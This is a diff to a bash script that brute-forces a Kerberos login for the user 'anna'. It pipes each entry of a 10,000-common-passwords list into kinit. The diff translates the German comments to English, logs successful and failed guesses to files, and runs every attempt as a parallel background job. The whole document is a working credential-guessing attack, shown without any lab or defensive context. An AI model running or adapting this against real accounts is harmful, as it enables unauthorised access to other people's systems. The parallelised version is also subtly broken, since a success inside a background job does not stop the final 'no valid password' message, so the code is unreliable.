@@ -1,26 +1,33 @@
 #!/bin/bash
 
-# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
+# Path to the file with the 10,000 most common passwords
 password_list_path="./10k-most-common.txt"
 
-# Benutzername, für den das Passwort getestet werden soll
+# Username for which the password will be tested
 username="anna"
 
-# Funktion, um Passwörter zu testen
+# Function to test passwords
 check_password() {
     local password="$1"
     echo "$password" | kinit "$username" > /dev/null 2>&1
     if [ $? -eq 0 ]; then
-        echo "Erfolgreich angemeldet als '$username' mit dem Passwort '$password'"
+        echo "Successful login as '$username' with password '$password'"
+        echo "$password" >> successful_passwords.txt
         exit 0
+    else
+        echo "Failed login as '$username' with password '$password'"
+        echo "$password" >> failed_passwords.txt
     fi
 }
 
-# Lesen Sie jedes Passwort aus der Liste und versuchen Sie, sich anzumelden
+# Read each password from the list and attempt to log in
 while IFS= read -r password; do
-    check_password "$password"
+    check_password "$password" &
 done < "$password_list_path"
 
-# Wenn kein gültiges Passwort gefunden wurde
-echo "Kein gültiges Passwort für '$username' gefunden."
+# Wait for all background processes to finish
+wait
+
+# If no valid password was found
+echo "No valid password found for '$username'."
 exit 1
